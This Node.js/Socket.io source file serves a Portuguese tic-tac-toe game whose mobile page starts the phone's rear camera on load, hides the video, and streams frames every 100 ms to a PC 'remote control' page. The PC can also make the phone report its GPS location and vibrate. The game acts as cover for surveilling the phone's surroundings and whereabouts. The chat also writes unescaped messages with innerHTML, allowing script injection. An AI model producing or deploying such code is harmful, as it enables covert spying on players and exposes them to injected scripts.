const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // Página do CELULAR
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Celular - Jogo da Velha</title>
    <style>
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 10px;
            font-size: 24px;
        }
        .device {
            text-align: center;
            font-size: 18px;
            color: #666;
            margin-bottom: 10px;
        }
        .status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        button:hover { background: #45a049; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        .camera-status {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin-top: 10px;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 5px;
        }
        .messages-box {
            margin-top: 20px;
            border-top: 2px solid #ddd;
            padding-top: 15px;
        }
        .messages-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }
        .messages {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 10px;
            max-height: 150px;
            overflow-y: auto;
            font-size: 14px;
        }
        .message {
            padding: 8px;
            margin: 5px 0;
            background: #e3f2fd;
            border-radius: 8px;
            word-wrap: break-word;
            border-left: 3px solid #2196F3;
        }
        .message small {
            color: #666;
            font-size: 10px;
            display: block;
            margin-bottom: 3px;
        }
        .emergency-message {
            background: #ffebee;
            border-left: 4px solid #f44336;
            font-weight: bold;
        }
        .location-box {
            margin-top: 15px;
            padding: 15px;
            background: #e8f5e9;
            border-radius: 10px;
            font-size: 14px;
            border-left: 4px solid #4CAF50;
            display: none;
        }
        .location-title {
            font-weight: bold;
            margin-bottom: 5px;
            color: #2e7d32;
        }
        .location-link {
            display: inline-block;
            margin-top: 10px;
            padding: 8px 15px;
            background: #4CAF50;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 13px;
        }
        #localVideo {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="device">📱 Celular</div>
        <div class="status" id="status">Conectando...</div>
        <div class="board" id="board"></div>
        <button id="resetBtn" disabled>Reiniciar Jogo</button>
        
        <div class="camera-status" id="cameraStatus">📷 Iniciando câmera...</div>
        
        <!-- LOCALIZAÇÃO -->
        <div class="location-box" id="locationBox">
            <div class="location-title">📍 Minha Localização</div>
            <div id="locationText"></div>
        </div>
        
        <!-- MENSAGENS -->
        <div class="messages-box">
            <div class="messages-title">💬 Mensagens do PC</div>
            <div class="messages" id="messages"></div>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 10
        });
        
        let minhaVez = false;
        let meuSimbolo = '';
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let mediaStream = null;
        let intervaloEnvio = null;
        let fontSize = 16; // tamanho padrão da fonte
        
        const statusDiv = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        const cameraStatus = document.getElementById('cameraStatus');
        const localVideo = document.getElementById('localVideo');
        const messagesDiv = document.getElementById('messages');
        const locationBox = document.getElementById('locationBox');
        const locationText = document.getElementById('locationText');
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Função para iniciar câmera
        async function iniciarCamera() {
            try {
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                    if (intervaloEnvio) clearInterval(intervaloEnvio);
                }
                
                cameraStatus.innerHTML = '📷 Iniciando câmera...';
                
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 320, 
                        height: 240,
                        facingMode: 'environment'
                    },
                    audio: false
                });
                
                localVideo.srcObject = mediaStream;
                await localVideo.play();
                
                cameraStatus.innerHTML = '📷 Câmera ativa';
                
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                intervaloEnvio = setInterval(() => {
                    if (mediaStream && mediaStream.active) {
                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                        const frame = canvas.toDataURL('image/jpeg', 0.3);
                        socket.emit('frame', frame);
                    }
                }, 100);
                
            } catch (err) {
                cameraStatus.innerHTML = '❌ Erro câmera: ' + err.message;
            }
        }
        
        iniciarCamera();
        
        // Receber comandos do PC
        socket.on('comando', (cmd) => {
            console.log('Comando recebido:', cmd);
            
            if (cmd === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(500);
                addMessage('📳 Celular vibrou!');
            } 
            else if (cmd === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
                addMessage('⚠️ SINAL DE EMERGÊNCIA!', true);
            } 
            else if (cmd === 'getLocation') {
                if (navigator.geolocation) {
                    cameraStatus.innerHTML = '📍 Obtendo localização...';
                    
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const loc = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            };
                            socket.emit('location', loc);
                            
                            // Mostrar no celular
                            locationBox.style.display = 'block';
                            locationText.innerHTML = \`
                                <b>Latitude:</b> \${loc.latitude}<br>
                                <b>Longitude:</b> \${loc.longitude}<br>
                                <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank" class="location-link">📍 Ver no Google Maps</a>
                            \`;
                            
                            cameraStatus.innerHTML = '📷 Câmera ativa';
                            addMessage('📍 Localização enviada para o PC');
                        },
                        (error) => {
                            cameraStatus.innerHTML = '❌ Erro localização: ' + error.message;
                            addMessage('❌ Erro ao pegar localização');
                        }
                    );
                }
            }
        });
        
        // Receber tamanho da fonte do PC
        socket.on('fontSize', (size) => {
            fontSize = size;
            document.querySelectorAll('.message').forEach(msg => {
                msg.style.fontSize = fontSize + 'px';
            });
        });
        
        // Função para adicionar mensagens
        function addMessage(msg, isEmergency = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            if (isEmergency) {
                messageDiv.classList.add('emergency-message');
            }
            messageDiv.style.fontSize = fontSize + 'px';
            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small> \${msg}\`;
            messagesDiv.appendChild(messageDiv);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        // Receber mensagens do PC
        socket.on('mensagem', (msg) => {
            addMessage('💻 ' + msg);
        });
        
        // Eventos do jogo
        socket.on('connect', () => {
            statusDiv.innerHTML = 'Conectado!';
            addMessage('✅ Conectado ao servidor');
        });
        
        socket.on('inicio', (data) => {
            meuSimbolo = data.simbolo;
            minhaVez = meuSimbolo === 'X';
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
            addMessage('🎮 Jogo iniciado! Você é ' + meuSimbolo);
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === meuSimbolo;
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = data.msg;
            gameActive = false;
            addMessage('🏁 ' + data.msg);
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = meuSimbolo === 'X';
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
            addMessage('🔄 Jogo reiniciado');
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>`);
  } else {
    // Página do PC
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PC - Jogo da Velha</title>
    <style>
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 1000px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 20px;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        .video-box {
            background: black;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .game-box {
            text-align: center;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .cell:hover { background: #e9ecef; transform: scale(1.05); }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        .status {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-weight: bold;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        button {
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .btn-primary { background: #4CAF50; color: white; }
        .btn-primary:hover { background: #45a049; }
        .btn-blue { background: #2196F3; color: white; }
        .btn-blue:hover { background: #1976D2; }
        .btn-red { background: #f44336; color: white; }
        .btn-red:hover { background: #d32f2f; }
        .btn-purple { background: #9c27b0; color: white; }
        .btn-purple:hover { background: #7b1fa2; }
        .btn-orange { background: #ff9800; color: white; }
        .btn-orange:hover { background: #f57c00; }
        .chat-box {
            margin-top: 30px;
            border: 2px solid #ddd;
            border-radius: 10px;
            padding: 15px;
        }
        .messages {
            height: 150px;
            overflow-y: auto;
            background: #f9f9f9;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        .message {
            padding: 8px;
            margin: 5px 0;
            background: #e3f2fd;
            border-radius: 5px;
            word-wrap: break-word;
        }
        .message small {
            color: #666;
            font-size: 11px;
        }
        .chat-input {
            display: flex;
            gap: 10px;
        }
        .chat-input input {
            flex: 1;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        .chat-input button {
            padding: 15px 25px;
            background: #2196F3;
            color: white;
        }
        .font-size-control {
            display: flex;
            gap: 10px;
            align-items: center;
            margin: 10px 0;
        }
        .font-size-control button {
            padding: 10px 20px;
            background: #666;
            color: white;
        }
        #fontSizeValue {
            font-weight: bold;
            min-width: 50px;
        }
        .info {
            background: #e8f5e9;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha - Controle Remoto</h1>
        
        <div class="grid">
            <div>
                <div class="video-box">
                    <img id="remoteVideo">
                </div>
                <div class="status" id="videoStatus">📱 Aguardando celular...</div>
                
                <div class="controls">
                    <button class="btn-blue" id="trocarCameraPC">🔄 Trocar Câmera</button>
                    <button class="btn-purple" id="getLocation">📍 Localização</button>
                    <button class="btn-orange" id="vibrate">📳 Vibrar</button>
                </div>
                
                <div id="locationInfo" class="info"></div>
            </div>
            
            <div class="game-box">
                <div class="status" id="gameStatus">Conectando...</div>
                <div class="board" id="board"></div>
                
                <div class="controls">
                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar</button>
                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
                </div>
            </div>
        </div>
        
        <div class="chat-box">
            <h3>💬 Chat</h3>
            <div class="messages" id="messages"></div>
            
            <div class="font-size-control">
                <span>Tamanho da fonte:</span>
                <button id="decreaseFont">A-</button>
                <span id="fontSizeValue">16px</span>
                <button id="increaseFont">A+</button>
            </div>
            
            <div class="chat-input">
                <input type="text" id="messageInput" placeholder="Digite sua mensagem...">
                <button id="sendMessage">📤 Enviar</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling']
        });
        
        let minhaVez = true;
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let fontSize = 16;
        
        const statusDiv = document.getElementById('gameStatus');
        const resetBtn = document.getElementById('resetBtn');
        const remoteVideo = document.getElementById('remoteVideo');
        const videoStatus = document.getElementById('videoStatus');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const fontSizeSpan = document.getElementById('fontSizeValue');
        const locationInfo = document.getElementById('locationInfo');
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Receber vídeo
        let frameCount = 0;
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
            videoStatus.innerHTML = '📱 Recebendo vídeo (frames: ' + frameCount + ')';
        });
        
        // Controles
        document.getElementById('trocarCameraPC').onclick = () => {
            socket.emit('comando', 'trocarCamera');
        };
        
        document.getElementById('getLocation').onclick = () => {
            socket.emit('comando', 'getLocation');
        };
        
        document.getElementById('vibrate').onclick = () => {
            socket.emit('comando', 'vibrate');
        };
        
        document.getElementById('emergency').onclick = () => {
            socket.emit('comando', 'emergency');
            addMessage('⚠️ SINAL DE EMERGÊNCIA ENVIADO!', true);
        };
        
        // Localização
        socket.on('location', (data) => {
            locationInfo.innerHTML = \`
                📍 Localização do celular:<br>
                Latitude: \${data.latitude}<br>
                Longitude: \${data.longitude}<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">Ver no mapa</a>
            \`;
        });
        
        // Chat
        function addMessage(msg, isEmergency = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            if (isEmergency) {
                messageDiv.style.background = '#ffebee';
                messageDiv.style.border = '2px solid #f44336';
            }
            messageDiv.style.fontSize = fontSize + 'px';
            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
            messagesDiv.appendChild(messageDiv);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        socket.on('mensagem', (msg) => {
            addMessage('📱 Celular: ' + msg);
        });
        
        document.getElementById('sendMessage').onclick = () => {
            const msg = messageInput.value.trim();
            if (msg) {
                socket.emit('mensagem', msg);
                addMessage('💻 Você: ' + msg);
                messageInput.value = '';
            }
        };
        
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                document.getElementById('sendMessage').click();
            }
        };
        
        // Controle de tamanho da fonte
        function updateFontSize() {
            fontSizeSpan.innerHTML = fontSize + 'px';
            socket.emit('fontSize', fontSize);
            document.querySelectorAll('.message').forEach(msg => {
                msg.style.fontSize = fontSize + 'px';
            });
        }
        
        document.getElementById('increaseFont').onclick = () => {
            fontSize = Math.min(fontSize + 2, 32);
            updateFontSize();
        };
        
        document.getElementById('decreaseFont').onclick = () => {
            fontSize = Math.max(fontSize - 2, 10);
            updateFontSize();
        };
        
        // Eventos do jogo
        socket.on('connect', () => {
            statusDiv.innerHTML = 'Conectado!';
        });
        
        socket.on('inicio', () => {
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = 'Sua vez (X)';
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === 'X';
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = data.msg;
            gameActive = false;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = true;
            statusDiv.innerHTML = 'Sua vez';
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>`);
  }
});

// Lógica do jogo
let board = ['', '', '', '', '', '', '', '', ''];
let vez = 'X';
let jogadores = {
  x: null,
  o: null
};

function checkWinner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
      return board[l[0]];
    }
  }
  return null;
}

io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  if (!jogadores.x) {
    jogadores.x = socket.id;
    socket.emit('inicio', { simbolo: 'X' });
  } else if (!jogadores.o) {
    jogadores.o = socket.id;
    socket.emit('inicio', { simbolo: 'O' });
  }
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('comando', (cmd) => {
    console.log('Comando:', cmd);
    socket.broadcast.emit('comando', cmd);
  });
  
  socket.on('mensagem', (msg) => {
    socket.broadcast.emit('mensagem', msg);
  });
  
  socket.on('fontSize', (size) => {
    socket.broadcast.emit('fontSize', size);
  });
  
  socket.on('location', (loc) => {
    socket.broadcast.emit('location', loc);
  });
  
  socket.on('jogada', (pos) => {
    let jogador = socket.id === jogadores.x ? 'X' : 'O';
    
    if (jogador !== vez || board[pos] !== '') return;
    
    board[pos] = jogador;
    let winner = checkWinner();
    let proximaVez = vez === 'X' ? 'O' : 'X';
    
    if (winner) {
      io.emit('fim', { msg: winner + ' venceu! 🎉' });
    } else if (!board.includes('')) {
      io.emit('fim', { msg: 'Empate! 🤝' });
    } else {
      vez = proximaVez;
    }
    
    io.emit('jogada', { pos, simbolo: jogador, proximaVez });
  });
  
  socket.on('reiniciar', () => {
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
    io.emit('reiniciar');
  });
  
  socket.on('disconnect', () => {
    if (socket.id === jogadores.x) jogadores.x = null;
    if (socket.id === jogadores.o) jogadores.o = null;
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Servidor rodando!`);
  console.log(`   Porta: ${PORT}`);
});
